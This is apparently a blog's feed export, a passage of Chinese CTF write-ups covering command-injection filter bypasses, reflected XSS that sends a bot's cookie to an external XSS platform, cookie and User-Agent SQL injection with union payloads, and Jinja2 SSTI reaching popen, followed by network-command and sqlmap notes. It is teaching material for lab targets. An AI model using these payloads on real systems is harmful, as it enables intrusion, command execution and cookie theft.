    <content type="html"><![CDATA[<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210262038134.png" alt=""></p><p>访问靶机发现过滤了很多字符</p><p>“&amp;””;”都被过滤用<code>%0a</code>代替并通过get传参绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0als</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210262034933.png" alt=""></p><p>接下来需要访问”flag_is_here”文件夹但是参数中不能包含flag和空格</p><p>空格使用<code>$&#123;IFS&#125;</code>绕过，flag使用<code>fl&#39;&#39;ag</code>绕过</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0als$&#123;IFS&#125;fl&#x27;&#x27;ag_is_here</span><br></pre></td></tr></table></figure><p>同样采用get方式传参</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210262101246.png" alt=""></p><p>现在则需要访问这个包含flag的文件</p><p>绕过cat只需要将cat变为<code>c&#39;&#39;at</code>或者<code>c&quot;&quot;at</code>即可</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0acd$&#123;IFS&#125;fl&#x27;&#x27;ag_is_here%0ac&#x27;&#x27;at$&#123;IFS&#125;fl&#x27;&#x27;ag_180433190211991.php</span><br></pre></td></tr></table></figure><p>查看界面源代码即可得到flag</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210262104929.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;解题过程&quot;&gt;&lt;a href=&quot;#解题过程&quot; class=&quot;headerlink&quot; title=&quot;解题过程&quot;&gt;&lt;/a&gt;解题过程&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_RCE命令执行</title>
    <link href="https://guuuuq.github.io/posts/43e81f2c.html"/>
    <id>https://guuuuq.github.io/posts/43e81f2c.html</id>
    <published>2022-10-25T21:58:01.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是命令注入"><a href="#什么是命令注入" class="headerlink" title="什么是命令注入"></a>什么是命令注入</h1><p>指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><p>在Web应用中，有时候会用到一些命令执行的函数，如php中system、exec、shell_exec等，当对用户输入的命令没有进行限制或者过滤不严导致用户可以执行任意命令时，就会造成命令执行漏洞。</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>访问靶机，直接显示了ping命令和php代码<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252202657.png" alt=""></p><p>直接注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252204670.png" alt=""></p><p>尝试显示数字命名的php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat 204251899621953.php</span><br></pre></td></tr></table></figure><p>运行后发现界面没有内容，用ctrl+u查看源代码</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252209156.png" alt=""></p><p>或者使用base64编码打印出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat 204251899621953.php|base64</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252213199.png" alt=""></p><p>解码即可得到flag</p><h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p>访问靶机发现cat被过滤，需要寻找方法绕过</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252221499.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head 只显示头几行</span><br><span class="line">tail 只显示最后几行</span><br><span class="line">nl 类似于cat -n，显示时输出行号</span><br><span class="line">tailf 类似于tail -f</span><br></pre></td></tr></table></figure><p>依旧ls命令查看目录</p><p>再用以上命令替换cat即可得到flag（经尝试除了tailf均可成功得到flag）</p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>访问靶机发现过滤了空格</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252236001.png" alt=""></p><p>使用<code>IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</code>来代替空格</p><p>方法如上</p><h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p>访问靶机发现过滤了目录分隔符</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252240253.png" alt=""></p><p>查看目录发现一个可能有flag的文件夹</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252243343.png" alt=""></p><p>不能使用目录分隔符，则使用cd命令进入文件夹和ls查看文件列表(多个命令用”|”分隔开)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cd flag_is_here;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252245316.png" alt=""></p><p>使用cd命令和cat命令组合即可得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cd flag_is_here;cat flag_3254971985104.php</span><br></pre></td></tr></table></figure><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>访问靶机发现过滤了”|”和”&amp;”</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210252248592.png" alt=""></p><p>组合命令”|”和”&amp;”可以使用”;”替代</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p>后续命令替换即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是命令注入&quot;&gt;&lt;a href=&quot;#什么是命令注入&quot; class=&quot;headerlink&quot; title=&quot;什么是命令注入&quot;&gt;&lt;/a&gt;什么是命令注入&lt;/h1&gt;&lt;p&gt;指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。&lt;/p&gt;
&lt;p&gt;在Web应用中</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_反射型XSS</title>
    <link href="https://guuuuq.github.io/posts/42af21c2.html"/>
    <id>https://guuuuq.github.io/posts/42af21c2.html</id>
    <published>2022-10-24T21:22:12.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行</p><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>通过给别人发送带有恶意脚本代码参数的url，当url地址被打开时，特有的恶意代码参数别html解析，执行。特点是非持久化，也不存入网站服务器中。</p><p><strong>缺点</strong>：</p><p>必须用户点击带有特定恶意脚本代码参数的链接才能执行</p><p>恶意代码存放在url中，只有用户在点击恶意链接的时候才会执行恶意代码，所以<strong>它的隐蔽性很差</strong></p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>访问靶机</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242130081.png" alt=""></p><p>测试是否可以执行js语句</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242132030.png" alt=""></p><p>可以执行</p><p>利用<a href="https://xssaq.com/">xss平台</a>进行攻击</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242135858.png" alt=""></p><p>创建一个项目并将其中的代码填写到上方传参框提交</p><p>下方框的意义是模拟“网站的机器人”访问该url从而拿到该用户的cookie或其他信息</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242137358.png" alt=""></p><p>得到flag</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210242140545.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什么是XSS&lt;/h1&gt;&lt;p&gt;XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_UA注入</title>
    <link href="https://guuuuq.github.io/posts/dc8b3729.html"/>
    <id>https://guuuuq.github.io/posts/dc8b3729.html</id>
    <published>2022-10-23T16:34:29.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是UA注入"><a href="#什么是UA注入" class="headerlink" title="什么是UA注入"></a>什么是UA注入</h1><p>类比之前的cookie注入，是ua处有漏洞导致sql注入的产生，即在User-Agent注入sql语句</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>可以用hackbar添加user-agent并在其中注入sql语句或者使用sqlmap</p><p>这里使用sqlmap解题</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231640523.png" alt=""><br>设置探测等级为3（具体参考sqlmap使用方法）<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231642542.png" alt=""><br>拿到数据库数据<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231643958.png" alt=""><br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231644089.png" alt=""><br>当前库为’sqli’<br>后面的步骤参考sqlmap使用方法，此处省略（关键就是设置一个“—level 3”的参数）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是UA注入&quot;&gt;&lt;a href=&quot;#什么是UA注入&quot; class=&quot;headerlink&quot; title=&quot;什么是UA注入&quot;&gt;&lt;/a&gt;什么是UA注入&lt;/h1&gt;&lt;p&gt;类比之前的cookie注入，是ua处有漏洞导致sql注入的产生，即在User-Agent注入sql语</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_Web_Cookie注入</title>
    <link href="https://guuuuq.github.io/posts/8713efdd.html"/>
    <id>https://guuuuq.github.io/posts/8713efdd.html</id>
    <published>2022-10-23T11:42:58.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是cookie注入"><a href="#什么是cookie注入" class="headerlink" title="什么是cookie注入"></a>什么是cookie注入</h1><p>cookie注入其原理也和平时的注入一样，只不过注入参数换成了cookie</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>访问靶机<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231146791.png" alt=""><br>用burpsuite抓包<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231147568.png" alt=""><br>这里提前用sqlmap扫了一下发现可以用union注入<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231150897.png" alt=""><br>可以直接用sqlmap做，记录复习一下union手注</p><h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select database(),version()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231154196.png" alt=""></p><h2 id="获取数据库sqli中的表名"><a href="#获取数据库sqli中的表名" class="headerlink" title="获取数据库sqli中的表名"></a>获取数据库sqli中的表名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231159552.png" alt=""></p><h2 id="获取数据表xwnlfxsthm中的字段名"><a href="#获取数据表xwnlfxsthm中的字段名" class="headerlink" title="获取数据表xwnlfxsthm中的字段名"></a>获取数据表xwnlfxsthm中的字段名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(column_name) from information_schema.columns where table.name=&#x27;xwnlfxsthm&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231203245.png" alt=""></p><h2 id="获取字段nciapffkhv的值"><a href="#获取字段nciapffkhv的值" class="headerlink" title="获取字段nciapffkhv的值"></a>获取字段nciapffkhv的值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(oagqtazgas) from xwnlfxsthm</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210231206873.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是cookie注入&quot;&gt;&lt;a href=&quot;#什么是cookie注入&quot; class=&quot;headerlink&quot; title=&quot;什么是cookie注入&quot;&gt;&lt;/a&gt;什么是cookie注入&lt;/h1&gt;&lt;p&gt;cookie注入其原理也和平时的注入一样，只不过注入参数换成了coo</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HNCTF_web_ez_SSTI</title>
    <link href="https://guuuuq.github.io/posts/7b46813d.html"/>
    <id>https://guuuuq.github.io/posts/7b46813d.html</id>
    <published>2022-10-20T17:03:04.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是SSTI"><a href="#什么是SSTI" class="headerlink" title="什么是SSTI"></a>什么是SSTI</h1><p>SSTI:Server Side Template Injection，服务端模板注入</p><p>在详细解释SSTI之前需要了解模板和模板引擎</p><p>比如在搜索引擎搜索资料，页面返回的大致格式是不变的，改变的是你查询的内容，这个框架（大致格式）指的就是模板。主要作用就是将用户查询的动态数据与静态信息分离，大大提高了开发效率。服务端把相应的模板文件和一些变量传递给模板引擎，模板引擎解析后再传给用户端 ，模板引擎只负责处理模板上的语句，这就导致可能会被攻击者利用，他们把恶意的模板与语句注入到模板中，模板引擎执行模板中的语句就会执行恶意代码，将结果返回给客户端。</p><h1 id="识别不同模板"><a href="#识别不同模板" class="headerlink" title="识别不同模板"></a>识别不同模板</h1><p>常见的模板有很多，不同模板的语法也不相同，在实际情况我们可以测试判断属于哪一种模板。<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210201712226.webp" alt=""><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Twig&#123;&#123;7*&#x27;7&#x27;&#125;&#125;结果49 </span><br><span class="line">jinja2&#123;&#123;7*&#x27;7&#x27;&#125;&#125;结果为7777777 </span><br><span class="line">smarty7&#123;*comment*&#125;7为77</span><br></pre></td></tr></table></figure><br>当我们发现漏洞时想用一些恶意命令来执行一些操作，但是调用python中某些模块使用的系统命令是不可行的，因为模板引擎会限制import声明语法，于是只能使用python中的魔术方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>执行模板判断语句可知该模板为jinja2模板</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210201724834.png" alt=""><br>通过以下语句拿到可用的类的列表<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><br>结果如下<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210201726932.png" alt=""><br>如果直接用眼找我们需要执行语句的索引位置会非常麻烦，这里我们把它们复制到vscode中，使用搜索功能查找我们需要的语句的位置，并根据其前后的逗号位置判断它的索引位置<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210201738262.png" alt=""><br>查询到<class ‘os._wrap_close’>命令位于137左右，上下浮动几位尝试一下并执行以下语句<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210201741613.png" alt=""><br>说明137就是它的索引位置</p><p>仅有两个文件，使用以下语句查看flag的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210201743778.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是SSTI&quot;&gt;&lt;a href=&quot;#什么是SSTI&quot; class=&quot;headerlink&quot; title=&quot;什么是SSTI&quot;&gt;&lt;/a&gt;什么是SSTI&lt;/h1&gt;&lt;p&gt;SSTI:Server Side Template Injection，服务端模板注入&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>计算机网络_常用网络命令</title>
    <link href="https://guuuuq.github.io/posts/885c58f2.html"/>
    <id>https://guuuuq.github.io/posts/885c58f2.html</id>
    <published>2022-10-19T21:41:52.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<p>由于可能泄露本机信息，部分执行图片均已保存，不在博客中进行展示</p><h1 id="ping域名或IP地址"><a href="#ping域名或IP地址" class="headerlink" title="ping域名或IP地址"></a>ping域名或IP地址</h1><p>ping是一个十分基本但又十分重要的TCP/IP网络工具。</p><h2 id="主要作用"><a href="#主要作用" class="headerlink" title="主要作用"></a>主要作用</h2><p>1.检测网络的连通情况和测试网络速度；<br>2.根据域名得到相应主机的IP地址；<br>3.根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量；<br>4.ping命令常常被黑客用来进行网络扫描和攻击；</p><p>对于网络管理员和普通用户来说，我们通常用它来测试网络的连通情况，如果无法正常上网，ping命令是检测网络故障的基本工具。</p><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210192155777.png" alt=""></p><ul><li>bytes值：表示通信过程中发送的数据包大小，单位是字节。</li><li>time值：表示响应时间，这个时间越小，说明你与对方通信的速度越快，延时越短。</li><li>TTL值：Time To Live,表示数据包再经过多少个路由器如果还不能到达就将被丢弃，这里可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列。默认情况下，Linux系统的TTL最大值为64或255，WindowsNT/2000/XP系统的TTL最大值为128，UNIX主机的TTL最大值为255。</li></ul><h1 id="ipconfig-all-release-renew-flushdns"><a href="#ipconfig-all-release-renew-flushdns" class="headerlink" title="ipconfig /all (/release, /renew, /flushdns)"></a>ipconfig /all (/release, /renew, /flushdns)</h1><p>ipconfig是调试计算机网络的常用命令，通常大家使用它显示计算机中网络适配器的IP地址、子网掩码及默认网关。</p><h2 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all：显示本机TCP/IP配置的详细信息；</span><br><span class="line">ipconfig /release：DHCP客户端手工释放IP地址；</span><br><span class="line">ipconfig /renew：DHCP客户端手工向服务器刷新请求；</span><br><span class="line">ipconfig /flushdns：清除本地DNS缓存内容；</span><br></pre></td></tr></table></figure><h2 id="执行结果-1"><a href="#执行结果-1" class="headerlink" title="执行结果"></a>执行结果</h2><p>ipconfig /all<br>由于隐私原因就不放图片了</p><p>ipconfig /release<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210192212147.png" alt=""></p><p>ipconfig /renew<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210192209322.png" alt=""></p><p>ipconfig /flushdns<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210192210768.png" alt=""></p><h1 id="netstat-–a-n-e-–s-r-p-tcp-s-–p-tcp"><a href="#netstat-–a-n-e-–s-r-p-tcp-s-–p-tcp" class="headerlink" title="netstat –a (-n, -e, –s,-r, -p tcp, -s –p tcp)"></a>netstat –a (-n, -e, –s,-r, -p tcp, -s –p tcp)</h1><p>Netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。</p><h2 id="常见参数-1"><a href="#常见参数-1" class="headerlink" title="常见参数"></a>常见参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netstat -a：显示所有socket，包括正在监听的。</span><br><span class="line">netstat -n：以数字形式显示地址和端口号。</span><br><span class="line">netstat -e：显示以太网统计。</span><br><span class="line">netstat -s：分别显示各个协议的统计。</span><br><span class="line">netstat -r：显示核心路由表，格式同“route -e”。</span><br><span class="line">netstat -p tcp：显示指定为TCP协议的使用情况</span><br><span class="line">netstat -s -p tcp:显示指定为TCP协议的统计数据和使用情况</span><br></pre></td></tr></table></figure><h1 id="arp-–a-s-ip地址-mac地址，-d-ip地址"><a href="#arp-–a-s-ip地址-mac地址，-d-ip地址" class="headerlink" title="arp –a (-s ip地址 mac地址，-d ip地址)"></a>arp –a (-s ip地址 mac地址，-d ip地址)</h1><p>ARP:地址解析协议（Address Resolution Protocol）<br>知道目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。<br>它是IPv4中网络层必不可少的协议，不过在IPv6中已不再适用，并被邻居发现协议（NDP）所替代。</p><h2 id="常见参数-2"><a href="#常见参数-2" class="headerlink" title="常见参数"></a>常见参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp -a：显示当期ip地址对应的mac地址</span><br><span class="line">arp -s ip地址 mac地址：给指定的ip地址绑定mac地址</span><br><span class="line">arp -d ip地址：删除指定ip地址绑定的mac地址</span><br></pre></td></tr></table></figure><h1 id="tracert-域名或IP地址"><a href="#tracert-域名或IP地址" class="headerlink" title="tracert 域名或IP地址"></a>tracert 域名或IP地址</h1><p>Tracert是Windows路由跟踪程序，在cmd中使用，用于确定 IP数据包访问目标所采取的路径。</p><h2 id="常见使用方法"><a href="#常见使用方法" class="headerlink" title="常见使用方法"></a>常见使用方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert 域名或ip地址：指定返回该域名或者地址所到达目的地的各种ip地址</span><br></pre></td></tr></table></figure><h1 id="route-print-add-delete"><a href="#route-print-add-delete" class="headerlink" title="route print (add, delete)"></a>route print (add, delete)</h1><p>[<strong>Route就是用来显示、人工添加和修改路由表项目的。</strong>]Route命令是用于操作基于内核ip路由表，它的主要作用是创建一个静态路由让指定一个主机或者一个网络通过一个网络接口，如eth0。当使用”add”或者”del”参数时，路由表被修改，如果没有参数，则显示路由表当前的内容。</p><h2 id="常见参数-3"><a href="#常见参数-3" class="headerlink" title="常见参数"></a>常见参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">route print:显示路由表中的当前项目</span><br><span class="line">route add:添加一条静态路由</span><br><span class="line">route delete:删除一条路由</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于可能泄露本机信息，部分执行图片均已保存，不在博客中进行展示&lt;/p&gt;
&lt;h1 id=&quot;ping域名或IP地址&quot;&gt;&lt;a href=&quot;#ping域名或IP地址&quot; class=&quot;headerlink&quot; title=&quot;ping域名或IP地址&quot;&gt;&lt;/a&gt;ping域名或IP地址&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sqlmap使用方法</title>
    <link href="https://guuuuq.github.io/posts/11f9f536.html"/>
    <id>https://guuuuq.github.io/posts/11f9f536.html</id>
    <published>2022-10-18T21:46:55.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqlmap是什么"><a href="#sqlmap是什么" class="headerlink" title="sqlmap是什么"></a>sqlmap是什么</h1><p>sqlmap是一个自动化的sql注入工具，其主要功能是扫描，发现并利用给定的URL和sql注入漏洞，其广泛的功能和选项包括数据库指纹，枚举，数据库提权，访问目标文件系统，并在获取操作权限时执行任意命令。</p><h1 id="sqlmap基本命令"><a href="#sqlmap基本命令" class="headerlink" title="sqlmap基本命令"></a>sqlmap基本命令</h1><h2 id="1-选项"><a href="#1-选项" class="headerlink" title="1.选项"></a>1.选项</h2><p>在这些选项中必须提供至少有一个确定目标<br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-h,--help  显示基本帮助信息并退出</span><br><span class="line">-hh  显示高级帮助信息并退出</span><br><span class="line">--version  显示程序版本信息并退出</span><br></pre></td></tr></table></figure></p><h2 id="2-目标"><a href="#2-目标" class="headerlink" title="2.目标"></a>2.目标</h2><p>这些选项可以用来指定如何连接到目标URL<br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-u  目标URL  </span><br><span class="line">例：sqlmap -u &quot;www.abc.com/index.php?id=1&quot;</span><br><span class="line">-m  后接一个txt文件，文件中是多个url，sqlmap会自动化的检测其中的所有url。</span><br><span class="line">例：sqlmap -m target.txt</span><br><span class="line">-r  可以将一个post请求方式的数据包(bp抓包)保存在一个txt中，sqlmap会通过post方式检测目标。</span><br><span class="line">例：sqlmap -r bp.txt</span><br></pre></td></tr></table></figure></p><h2 id="3-请求"><a href="#3-请求" class="headerlink" title="3.请求"></a>3.请求</h2><p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。<br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--method=METHOD 指定是get方法还是post方法。</span><br><span class="line">例： --method=GET --method=POST</span><br><span class="line">--random-agent  使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在sqlmap/txt/user-agent.txt 在level&gt;=3时会检测user-agent注入。</span><br><span 